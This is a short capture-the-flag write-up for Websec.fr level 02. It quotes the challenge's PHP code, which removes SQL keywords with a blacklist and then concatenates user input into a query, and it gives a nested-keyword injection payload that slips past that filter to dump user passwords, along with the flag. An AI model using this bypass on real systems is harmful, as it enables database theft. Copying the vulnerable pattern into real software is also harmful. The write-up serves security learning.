+++
title = 'Websec.fr Level 02'
date = '2025-12-10T00:00:00+01:00'
draft = false
tags = ['websec', 'sqli']
+++

The source code of [level2](http://websec.fr/level02/index.php) is [here](http://websec.fr/level02/source.php)

![alt text](/images/stc/level2-intro.png)

```php
<?php
ini_set('display_errors', 'on');

class LevelTwo {
    public function doQuery($injection) {
        $pdo = new SQLite3('leveltwo.db', SQLITE3_OPEN_READONLY);

        $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
        $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);

        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query ($query);
        $users = $getUsers->fetchArray (SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    $lt = new LevelTwo ();
    $userDetails = $lt->doQuery ($_POST['user_id']);
}
?>

<!DOCTYPE html>
<html>
....
</html>
```
We can see that these to line was problematic, all  **words** in this **dictionnary** are removed
from payload.

```php
$searchWords = implode (['union', 'order', 'select', 'from', 'group','by'],'|');
$injection = preg_replace ('/' . $searchWords . '/i', '', $injection);
```

When we used a payload of [level1](http://websec.fr/level01/index.php) it catch a error,

```sql
Warning: SQLite3::query(): Unable to prepare statement: 1, near "id": syntax error in /index.php on line 12

Fatal error: Call to a member function fetchArray() on boolean in /index.php on line 13
```
so we can used one trick.
**Payload** :

`1 uniounionn selecselectt id, password frofromm users`
and it's work!

![alt text](/images/stc/level02-flag.png)

**Flag**: `WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`